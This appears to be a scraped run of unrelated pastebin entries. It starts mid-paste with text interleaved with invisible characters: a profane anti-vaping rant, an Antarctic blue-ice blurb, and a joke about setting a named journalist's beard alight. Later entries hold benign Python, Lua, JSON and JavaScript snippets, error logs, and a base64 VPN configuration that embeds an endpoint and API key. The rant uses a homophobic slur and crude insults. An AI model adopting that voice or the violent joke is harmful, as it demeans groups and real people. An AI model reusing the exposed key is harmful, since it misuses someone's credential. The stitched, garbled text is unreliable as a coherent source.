‎a‎ ‎g‎r‎e‎a‎t‎ ‎w‎a‎y‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎s‎m‎o‎k‎i‎n‎g‎.‎.‎.‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎,‎ ‎i‎t‎ ‎w‎a‎s‎.‎ ‎I‎n‎s‎t‎e‎a‎d‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎m‎o‎r‎o‎n‎i‎c‎ ‎f‎u‎c‎k‎w‎i‎t‎s‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎b‎a‎s‎t‎a‎r‎d‎i‎z‎e‎ ‎t‎h‎e‎ ‎i‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎s‎a‎k‎e‎ ‎o‎f‎ ‎c‎r‎e‎a‎t‎i‎n‎g‎ ‎a‎ ‎q‎u‎a‎s‎i‎-‎r‎e‎l‎i‎g‎i‎o‎u‎s‎ ‎""‎l‎i‎f‎e‎s‎t‎y‎l‎e‎""‎ ‎a‎r‎o‎u‎n‎d‎ ‎i‎t‎,‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎c‎a‎l‎l‎ ‎""‎v‎a‎p‎i‎n‎g‎""‎,‎ ‎p‎r‎i‎m‎a‎r‎i‎l‎y‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎u‎r‎p‎o‎s‎e‎ ‎o‎f‎ ‎o‎v‎e‎r‎-‎c‎o‎m‎p‎e‎n‎s‎a‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎ ‎l‎a‎c‎k‎ ‎o‎f‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎i‎t‎y‎,‎ ‎t‎h‎e‎ ‎e‎-‎c‎i‎g‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎h‎e‎s‎e‎ ‎r‎e‎j‎e‎c‎t‎s‎ ‎t‎o‎ ‎t‎r‎y‎ ‎a‎n‎d‎ ‎p‎a‎s‎s‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎o‎f‎f‎ ‎a‎s‎ ‎""‎u‎n‎i‎q‎u‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎s‎n‎o‎w‎f‎l‎a‎k‎e‎s‎""‎ ‎b‎y‎ ‎c‎o‎n‎t‎i‎n‎u‎a‎l‎l‎y‎ ‎a‎n‎d‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎ ‎h‎u‎f‎f‎i‎n‎g‎ ‎o‎f‎f‎ ‎a‎n‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎d‎i‎l‎d‎o‎ ‎f‎o‎r‎ ‎a‎ ‎d‎r‎u‎g‎ ‎f‎i‎x‎.‎

T‎o‎b‎a‎c‎c‎o‎ ‎c‎o‎m‎p‎a‎n‎i‎e‎s‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎q‎u‎i‎c‎k‎ ‎t‎o‎ ‎g‎e‎t‎ ‎i‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎a‎c‎t‎i‎o‎n‎,‎ ‎s‎w‎i‎t‎c‎h‎i‎n‎g‎ ‎g‎e‎a‎r‎s‎ ‎a‎n‎d‎ ‎p‎r‎o‎d‎u‎c‎i‎n‎g‎ ‎e‎-‎c‎i‎g‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎ ‎a‎n‎d‎ ‎p‎a‎r‎a‎p‎h‎e‎r‎n‎a‎l‎i‎a‎ ‎l‎e‎f‎t‎ ‎a‎n‎d‎ ‎r‎i‎g‎h‎t‎,‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎2‎1‎s‎t‎ ‎c‎e‎n‎t‎u‎r‎y‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎d‎r‎u‎g‎ ‎p‎i‎m‎p‎s‎,‎ ‎f‎o‎r‎c‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎d‎i‎m‎w‎i‎t‎t‎e‎d‎ ‎c‎u‎n‎t‎ ‎s‎t‎a‎r‎v‎e‎d‎ ‎c‎l‎i‎e‎n‎t‎e‎l‎e‎ ‎t‎o‎ ‎s‎u‎c‎k‎ ‎o‎f‎f‎ ‎t‎h‎e‎i‎r‎ ‎p‎h‎a‎l‎l‎i‎c‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎ ‎i‎n‎ ‎e‎x‎c‎h‎a‎n‎g‎e‎ ‎f‎o‎r‎ ‎a‎ ‎n‎i‎c‎o‎t‎i‎n‎e‎ ‎h‎i‎t‎.‎ ‎A‎s‎ ‎s‎u‎c‎h‎,‎ ‎e‎v‎e‎r‎y‎ ‎v‎a‎p‎e‎r‎ ‎i‎n‎ ‎e‎x‎i‎s‎t‎e‎n‎c‎e‎ ‎i‎s‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎j‎u‎s‎t‎ ‎a‎ ‎p‎i‎m‎p‎e‎d‎ ‎o‎u‎t‎ ‎d‎r‎u‎g‎g‎i‎e‎,‎ ‎s‎e‎r‎v‎i‎c‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎d‎o‎u‎c‎h‎e‎ ‎f‎l‎u‎t‎e‎s‎ ‎f‎o‎r‎ ‎a‎ ‎f‎e‎t‎i‎d‎ ‎f‎i‎x‎,‎ ‎p‎r‎o‎v‎i‎d‎e‎d‎ ‎b‎y‎ ‎P‎i‎m‎p‎ ‎D‎a‎d‎d‎y‎ ‎B‎i‎g‎ ‎T‎o‎b‎a‎c‎c‎o‎.‎

(‎(‎ ‎G‎E‎T‎ ‎T‎H‎O‎S‎E‎ ‎F‎A‎G‎ ‎S‎T‎I‎C‎K‎S‎ ‎A‎W‎A‎Y‎ ‎F‎R‎O‎M‎ ‎M‎E‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎l‎u‎e‎-‎i‎c‎e‎ ‎a‎r‎e‎a‎s‎ ‎a‎r‎e‎ ‎r‎e‎g‎i‎o‎n‎s‎ ‎o‎f‎ ‎A‎n‎t‎a‎r‎c‎t‎i‎c‎a‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎ ‎i‎c‎e‎ ‎s‎u‎r‎f‎a‎c‎e‎ ‎h‎a‎s‎ ‎a‎ ‎b‎l‎u‎e‎ ‎c‎o‎l‎o‎u‎r‎,‎ ‎c‎o‎n‎t‎r‎a‎s‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎m‎o‎r‎e‎ ‎c‎o‎m‎m‎o‎n‎ ‎w‎h‎i‎t‎e‎ ‎A‎n‎t‎a‎r‎c‎t‎i‎c‎ ‎s‎u‎r‎f‎a‎c‎e‎.‎ ‎T‎h‎e‎y‎ ‎f‎o‎r‎m‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎%‎ ‎o‎f‎ ‎t‎h‎e‎ ‎c‎o‎n‎t‎i‎n‎e‎n‎t‎'‎s‎ ‎i‎c‎e‎ ‎a‎r‎e‎a‎.‎ ‎B‎l‎u‎e‎-‎i‎c‎e‎ ‎a‎r‎e‎a‎s‎ ‎t‎y‎p‎i‎c‎a‎l‎l‎y‎ ‎f‎o‎r‎m‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎ ‎m‎o‎v‎e‎m‎e‎n‎t‎ ‎o‎f‎ ‎b‎o‎t‎h‎ ‎a‎i‎r‎ ‎a‎n‎d‎ ‎i‎c‎e‎ ‎a‎r‎e‎ ‎o‎b‎s‎t‎r‎u‎c‎t‎e‎d‎ ‎b‎y‎ ‎t‎o‎p‎o‎g‎r‎a‎p‎h‎i‎c‎ ‎o‎b‎s‎t‎a‎c‎l‎e‎s‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎m‎o‎u‎n‎t‎a‎i‎n‎s‎ ‎t‎h‎a‎t‎ ‎e‎m‎e‎r‎g‎e‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎i‎c‎e‎ ‎s‎h‎e‎e‎t‎,‎ ‎g‎e‎n‎e‎r‎a‎t‎i‎n‎g‎ ‎p‎a‎r‎t‎i‎c‎u‎l‎a‎r‎ ‎c‎l‎i‎m‎a‎t‎i‎c‎ ‎c‎o‎n‎d‎i‎t‎i‎o‎n‎s‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎ ‎n‎e‎t‎ ‎s‎n‎o‎w‎ ‎a‎c‎c‎u‎m‎u‎l‎a‎t‎i‎o‎n‎ ‎i‎s‎ ‎e‎x‎c‎e‎e‎d‎e‎d‎ ‎b‎y‎ ‎w‎i‎n‎d‎-‎d‎r‎i‎v‎e‎n‎ ‎s‎u‎b‎l‎i‎m‎a‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎s‎n‎o‎w‎ ‎t‎r‎a‎n‎s‎p‎o‎r‎t‎s‎.‎ ‎T‎h‎e‎y‎ ‎a‎r‎e‎ ‎n‎o‎t‎e‎d‎ ‎f‎o‎r‎ ‎b‎e‎i‎n‎g‎ ‎h‎a‎r‎d‎ ‎a‎n‎d‎ ‎f‎l‎a‎t‎,‎ ‎e‎n‎a‎b‎l‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎u‎s‎e‎ ‎a‎s‎ ‎a‎ ‎r‎u‎n‎w‎a‎y‎,‎ ‎i‎n‎ ‎a‎d‎d‎i‎t‎i‎o‎n‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎s‎t‎a‎b‎i‎l‎i‎t‎y‎.‎ ‎I‎c‎e‎ ‎o‎f‎ ‎u‎p‎ ‎t‎o‎ ‎2‎.‎7‎ ‎m‎i‎l‎l‎i‎o‎n‎ ‎y‎e‎a‎r‎s‎ ‎i‎n‎ ‎a‎g‎e‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎e‎x‎t‎r‎a‎c‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎b‎l‎u‎e‎-‎i‎c‎e‎ ‎a‎r‎e‎a‎s‎.‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎a‎l‎s‎o‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎s‎ ‎o‎f‎ ‎m‎e‎t‎e‎o‎r‎i‎t‎e‎s‎ ‎a‎c‎c‎u‎m‎u‎l‎a‎t‎e‎d‎ ‎o‎n‎ ‎t‎h‎e‎m‎,‎ ‎e‎i‎t‎h‎e‎r‎ ‎f‎r‎o‎m‎ ‎d‎i‎r‎e‎c‎t‎ ‎f‎a‎l‎l‎s‎ ‎o‎r‎ ‎h‎a‎v‎i‎n‎g‎ ‎b‎e‎e‎n‎ ‎t‎r‎a‎n‎s‎p‎o‎r‎t‎e‎d‎ ‎f‎r‎o‎m‎ ‎e‎l‎s‎e‎w‎h‎e‎r‎e‎ ‎b‎y‎ ‎i‎c‎e‎ ‎f‎l‎o‎w‎.‎ ‎T‎h‎i‎s‎ ‎N‎A‎S‎A‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎a‎ ‎b‎l‎u‎e‎-‎i‎c‎e‎ ‎a‎r‎e‎a‎ ‎i‎n‎ ‎t‎h‎e‎ ‎M‎i‎l‎l‎e‎r‎ ‎R‎a‎n‎g‎e‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎m‎e‎t‎e‎o‎r‎i‎t‎e‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎N‎i‎n‎a‎ ‎L‎a‎n‎z‎a‎ ‎/‎ ‎N‎A‎S‎A‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎l‎i‎g‎h‎t‎ ‎W‎o‎l‎f‎ ‎B‎l‎i‎t‎z‎e‎r‎'‎s‎ ‎b‎e‎a‎r‎d‎ ‎o‎n‎ ‎f‎i‎r‎e‎,‎ ‎t‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎t‎h‎r‎o‎w‎ ‎a‎ ‎p‎o‎s‎s‎u‎m‎ ‎a‎t‎ ‎R‎i‎c‎h‎a‎r‎d‎ ‎Q‎u‎e‎s‎t‎.‎"
uYpEyys3,Stand down text generator,jezzye13,Python,Tuesday 8th of April 2025 02:28:34 PM CDT,"# Stand down text generator
# Made by jezzye13
import requests
from datetime import datetime
from datetime import timedelta

now = datetime.now()
start_date = now.strftime(""%Y-%m-%d"")
end_date = (now + timedelta(days=1)).strftime(""%Y-%m-%d"")

url = ""https://api.track.toggl.com/api/v9/me/time_entries?start_date="" + start_date + ""&end_date="" + end_date
response = requests.get(url, auth=(""..."", ""...""))

tasksdone = []
for entries in response.json():
    tasksdone.append(entries['description'])
    
tasksdone = list(dict.fromkeys(tasksdone))

date_time = now.strftime(""%d/%m"")
print(""**Stand down**"", date_time)

for taskdone in tasksdone:
    print(""- "" + taskdone)"
uqruiZzj,Untitled,EdvartTempest,Lua,Tuesday 8th of April 2025 02:23:03 PM CDT,"vpn://eyJjb25maWdfdmVyc2lvbiI6IDEuMCwgImFwaV9lbmRwb2ludCI6ICJodHRwczovLzEzLjI0OC4xMzkuNDQvYXBpL3YxL3JlcXVlc3QvYXdnLyIsICJwcm90b2NvbCI6ICJhd2ciLCAibmFtZSI6ICJBbW5lemlhIEZyZWUgUlUiLCAiZGVzY3JpcHRpb24iOiAiQW1uZXppYSBGcmVlIGZvciBSdXNzaWEiLCAiYXBpX2tleSI6ICJjNDdIeXBvOS5QNjRKY1MyaXhUcVBidnJkOGs5UXZaeXA4VUlXVDVkcSJ9
"
7vyhGW2s,2025-04-08T14:18:30.380328,powerampache,PHP,Tuesday 8th of April 2025 02:18:48 PM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""play.dogmazic.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getGenres() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""play.dogmazic.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""play.dogmazic.net\"": No address associated with hostname\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
H7xbnK9u,2025-04-08T14:18:30.381106,powerampache,PHP,Tuesday 8th of April 2025 02:18:47 PM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""play.dogmazic.net"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""Unable to resolve host \""play.dogmazic.net\"": No address associated with hostname\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""Unable to resolve host \""play.dogmazic.net\"": No address associated with hostname\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
XKtYYe1C,test,shjavohir,JSON,Tuesday 8th of April 2025 02:03:27 PM CDT,"{
  ""webhookUrl"": ""TEST_WEBHOOK_URL"",
  ""phoneCallId"": ""test"",
  ""assistantId"": ""test"",
  ""assistantDetails"": {
    ""assistantName"": ""Akshay""
  },
  ""brokerDetails"": {
    ""brokerName"": ""ZeusFreight"",
    ""brokerPhoneNumber"": ""+1234567890""
  },
  ""loadDetails"": {
    ""loadId"": ""LNK456"",
    ""origin"": ""Los Angeles, CA"",
    ""destination"": ""Phoenix, AZ"",
    ""equipmentType"": ""Reefer"",
    ""weightLbs"": 38000,
    ""offeredRate"": 900,
    ""targetRateMin"": 1100,
    ""targetRateMax"": 1250,
    ""loadBoardSource"": ""Truckstop""
  },
  ""companyDetails"": {
    ""companyName"": ""Simona"",
    ""companyDOT"": ""67890"",
    ""companyMC"": ""567890"",
    ""companyAddress"": ""12 Main St, Bakersfield, CA 93301"",
    ""companyPhoneNumber"": ""+1234567890"",
    ""companyEmail"": ""accounting@simonainc.com"",
    ""companyWebsite"": ""www.simonainc.com"",
    ""truckLocation"": ""San Bernardino, CA""
  }
}"
aunLQL1v,Team Pick SS,Parallaxox,Lua,Tuesday 8th of April 2025 01:56:26 PM CDT,"--https://youtu.be/rvva4TSGunI
local Players = game:GetService(""Players"")
local Teams = game:GetService(""Teams"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local teamPickValue = ReplicatedStorage:FindFirstChild(""TeamPick"")
if not teamPickValue then
	teamPickValue = Instance.new(""StringValue"")
	teamPickValue.Name = ""TeamPick""
	teamPickValue.Parent = ReplicatedStorage
end

-- Ensure red/blue teams exist
local function ensureTeamsExist()
	local redTeam = Teams:FindFirstChild(""Red"")
	local blueTeam = Teams:FindFirstChild(""Blue"")

	if not redTeam then
		redTeam = Instance.new(""Team"")
		redTeam.Name = ""Red""
		redTeam.TeamColor = BrickColor.new(""Bright red"")
		redTeam.Parent = Teams
	end

	if not blueTeam then
		blueTeam = Instance.new(""Team"")
		blueTeam.Name = ""Blue""
		blueTeam.TeamColor = BrickColor.new(""Bright blue"")
		blueTeam.Parent = Teams
	end
end

ensureTeamsExist()

--Assign players to the team with fewer players
Players.PlayerAdded:Connect(function(player)
	local redPlayers = {}
	local bluePlayers = {}

	for _, p in pairs(Players:GetPlayers()) do
		if p.Team and p.Team.Name == ""Red"" then
			table.insert(redPlayers, p)
		elseif p.Team and p.Team.Name == ""Blue"" then
			table.insert(bluePlayers, p)
		end
	end

	if #redPlayers <= #bluePlayers then
		player.Team = Teams:FindFirstChild(""Red"")
	else
		player.Team = Teams:FindFirstChild(""Blue"")
	end
end)

--Choose a random player from a team with 2 or more members
local function chooseFromTeamWithTwoPlayers()
	for _, team in pairs(Teams:GetChildren()) do
		local teamList = {}
		for _, player in pairs(Players:GetPlayers()) do
			if player.Team == team then
				table.insert(teamList, player)
			end
		end

		if #teamList >= 2 then
			local teamChosen = teamList[math.random(1, #teamList)]
			teamPickValue.Value = ""Team Pick: "" .. teamChosen.Name
			return
		end
	end

	teamPickValue.Value = ""No team has at least two players""
end

-- Delay to allow players to load in
task.wait(20)
chooseFromTeamWithTwoPlayers()

"
ppVWdRuf,Team Pick LS,Parallaxox,Lua,Tuesday 8th of April 2025 01:54:43 PM CDT,"--https://youtu.be/rvva4TSGunI
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""PickerGui""
screenGui.Parent = playerGui

local textLabel = Instance.new(""TextLabel"")
textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
textLabel.Position = UDim2.new(0.25, 0, 0.05, 0)
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Text = ""Waiting for selection...""
textLabel.Parent = screenGui

local teamPickValue = ReplicatedStorage:FindFirstChild(""TeamPick"")

local function updateGui()
	local displayText = ""Waiting for selection...""
	if teamPickValue and teamPickValue.Value ~= ""Waiting for selection..."" then
		displayText = teamPickValue.Value
	end
	textLabel.Text = displayText
end

if teamPickValue then
	teamPickValue.Changed:Connect(updateGui)
end
"
3BUKLd4M,Multi-Player Pick SS,Parallaxox,Lua,Tuesday 8th of April 2025 01:53:54 PM CDT,"--https://youtu.be/rvva4TSGunI
local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")

local multiPickPlayersValue = ReplicatedStorage:FindFirstChild(""MultiPickPlayers"")
if not multiPickPlayersValue then
	multiPickPlayersValue = Instance.new(""StringValue"")
	multiPickPlayersValue.Name = ""MultiPickPlayers""
	multiPickPlayersValue.Parent = ReplicatedStorage
end

local function chooseMultiplePlayers(numPlayersToChoose)
	local playerList = Players:GetPlayers()
	local chosenPlayers = {}

	if #playerList < numPlayersToChoose then
		multiPickPlayersValue.Value = ""Not enough players""
		return
	end

	while #chosenPlayers < numPlayersToChoose do
		local player = playerList[math.random(1, #playerList)]
		if not table.find(chosenPlayers, player) then
			table.insert(chosenPlayers, player)
		end
	end

	local chosenPlayerNames = {}
	for _, player in pairs(chosenPlayers) do
		table.insert(chosenPlayerNames, player.Name)
	end

	multiPickPlayersValue.Value = ""Multi-Pick: "" .. table.concat(chosenPlayerNames, "", "")
end

task.wait(20)
chooseMultiplePlayers(2)
"
x5yR9wJ3,Multi-Player Pick LS,Parallaxox,Lua,Tuesday 8th of April 2025 01:52:40 PM CDT,"//https://youtu.be/rvva4TSGunI
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""PickerGui""
screenGui.Parent = playerGui

local textLabel = Instance.new(""TextLabel"")
textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
textLabel.Position = UDim2.new(0.25, 0, 0.05, 0)
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Text = ""Waiting for selection...""
textLabel.Parent = screenGui

local multiPickPlayersValue = ReplicatedStorage:FindFirstChild(""MultiPickPlayers"")

local function updateGui()
	local displayText = ""Waiting for selection...""
	if multiPickPlayersValue and multiPickPlayersValue.Value ~= ""Waiting for selection..."" then
		displayText = multiPickPlayersValue.Value
	end
	textLabel.Text = displayText
end

if multiPickPlayersValue then
	multiPickPlayersValue.Changed:Connect(updateGui)
end
"
5T537SX5,Chosen Player Teleport SS,Parallaxox,Lua,Tuesday 8th of April 2025 01:51:12 PM CDT,"--https://youtu.be/rvva4TSGunI
local Players = game:GetService(""Players"")
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Workspace = game:GetService(""Workspace"")

-- Setup shared value
local chosenPlayerValue = ReplicatedStorage:FindFirstChild(""ChosenPlayer"")
if not chosenPlayerValue then
	chosenPlayerValue = Instance.new(""StringValue"")
	chosenPlayerValue.Name = ""ChosenPlayer""
	chosenPlayerValue.Parent = ReplicatedStorage
end

-- Setup spawn parts
local chosenSpawn = Workspace:FindFirstChild(""ChosenSpawn"") or Instance.new(""Part"", Workspace)
chosenSpawn.Size = Vector3.new(6, 1, 6)
chosenSpawn.Position = Vector3.new(50, 3, 100)
chosenSpawn.Anchored = true
chosenSpawn.BrickColor = BrickColor.new(""Bright green"")
chosenSpawn.Name = ""ChosenSpawn""

local otherSpawn = Workspace:FindFirstChild(""OtherSpawn"") or Instance.new(""Part"", Workspace)
otherSpawn.Size = Vector3.new(6, 1, 6)
otherSpawn.Position = Vector3.new(-50, 3, 100)
otherSpawn.Anchored = true
otherSpawn.BrickColor = BrickColor.new(""Bright red"")
otherSpawn.Name = ""OtherSpawn""

-- Pick one random player and teleport
local function chooseRandomPlayer()
	local playerList = Players:GetPlayers()
	if #playerList == 0 then return end

	local chosenPlayer = playerList[math.random(1, #playerList)]
	chosenPlayerValue.Value = ""Chosen Player: "" .. chosenPlayer.Name

	if chosenPlayer.Character then
		chosenPlayer.Character:MoveTo(chosenSpawn.Position)
	end

	for _, player in pairs(playerList) do
		if player ~= chosenPlayer and player.Character then
			player.Character:MoveTo(otherSpawn.Position)
		end
	end
end

task.wait(10)
chooseRandomPlayer()
"
gjmHdc5V,Chosen Player Teleport LS,Parallaxox,Lua,Tuesday 8th of April 2025 01:49:34 PM CDT,"--https://youtu.be/rvva4TSGunI
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

-- Create GUI
local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""PickerGui""
screenGui.Parent = playerGui

local textLabel = Instance.new(""TextLabel"")
textLabel.Size = UDim2.new(0.5, 0, 0.1, 0)
textLabel.Position = UDim2.new(0.25, 0, 0.05, 0)
textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Text = ""Waiting for selection...""
textLabel.Parent = screenGui

local chosenPlayerValue = ReplicatedStorage:FindFirstChild(""ChosenPlayer"")

-- Update GUI when value changes
local function updateGui()
	local displayText = ""Waiting for selection...""
	if chosenPlayerValue and chosenPlayerValue.Value ~= ""Waiting for selection..."" then
		displayText = chosenPlayerValue.Value
	end
	textLabel.Text = displayText
end

if chosenPlayerValue then
	chosenPlayerValue.Changed:Connect(updateGui)
end
"
m0WzsZJs,03-StockFlow-Resources,Onesible,JavaScript,Tuesday 8th of April 2025 01:27:07 PM CDT,"const url = `http://localhost:3030/jsonstore/orders/`;

const ordersList = document.getElementById('list');
const orderBtn = document.getElementById('order-btn');
const editBtn = document.getElementById('edit-order');

const stockName = document.getElementById('name');
const stockQuantity = document.getElementById('quantity');
const orderDate = document.getElementById('date');

function attachEvents() {
    document.getElementById('load-orders').addEventListener('click', loadOrders);
    orderBtn.addEventListener('click', onOrder);
    editBtn.addEventListener('click', onEdit);
}

async function onLoad() {
    let res = await fetch(url);
    let data = await res.json();
    
    return Object.values(data);
}

async function loadOrders() {
    let orders = await onLoad();
    ordersList.replaceChildren();

    orders.forEach(order => {
        let changeBtn = create('button', ['Change'], 'change-btn');
        let doneBtn = create('button', ['Done'], 'done-btn');

        changeBtn.addEventListener('click', () => onChange(order._id, order.name, order.quantity, order.date));
        doneBtn.addEventListener('click', () => onDone(order._id));

        ordersList.appendChild(
            create('div', [
                create('h2', [order.name]),
                create('h3', [order.date]),
                create('h3', [order.quantity]),
                changeBtn,
                doneBtn
            ], 'container')
        );
    })
}

async function onOrder(e) {
    e.preventDefault();

    let options = {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            name: stockName.value,
            quantity: stockQuantity.value,
            date: orderDate.value
        })
    }

    e.target.parentElement.reset();

    await fetch(url, options);
    loadOrders();
}

function onChange(id, name, quantity, date) {
    stockName.value = name;
    stockQuantity.value = quantity;
    orderDate.value = date;

    editBtn.dataset.id = id;
    editBtn.disabled = false;
    orderBtn.disabled = true;
}

async function onEdit(e) {
    e.preventDefault();

    let options = {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            _id: e.target.dataset.id,
            name: stockName.value,
            quantity: stockQuantity.value,
            date: orderDate.value
        })
    }

    editBtn.disabled = true;
    orderBtn.disabled = false;

    e.target.parentElement.reset();

    await fetch(url + e.target.dataset.id, options);
    loadOrders();
}

async function onDone(id) {
    await fetch(url + id, { method: 'DELETE' })
    loadOrders();
}

function create(tag, children, className) {
    let el = document.createElement(tag);
    if (className) {
        el.className = className;
    }
    children.forEach(child => {
        if (typeof child === 'object') {
            el.appendChild(child);
        } else {
            el.appendChild(document.createTextNode(child));
        }
    });

    return el;
}

attachEvents();"
eAu6rtPz,02-Event-Tracker-Resources,Onesible,JavaScript,Tuesday 8th of April 2025 01:26:25 PM CDT,"function solve() {
    let saveBtn = document.getElementById('save');
    saveBtn.addEventListener('click', onSave);
    document.querySelector('.delete').addEventListener('click', onDelete);

    let upcomingEvents = document.getElementById('upcoming-list');
    let eventList = document.getElementById('events-list');

    let eventName = document.getElementById('event');
    let note = document.getElementById('note');
    let date = document.getElementById('date');

    function onSave(e) {
        e.preventDefault();

        if (!eventName.value || !note.value || !date.value) {
            return;
        }

        let li = create('li', [
            create('div', [
                create('article', [
                    create('p', [`Name: ${eventName.value}`]),
                    create('p', [`Note: ${note.value}`]),
                    create('p', [`Date: ${date.value}`])
                ]),
                create('div', [], 'buttons')
            ], 'event-container')
        ], 'event-item');

        upcomingEvents.appendChild(li);

        let editBtn = document.createElement('button');
        editBtn.className = 'btn edit';
        editBtn.textContent = 'Edit';
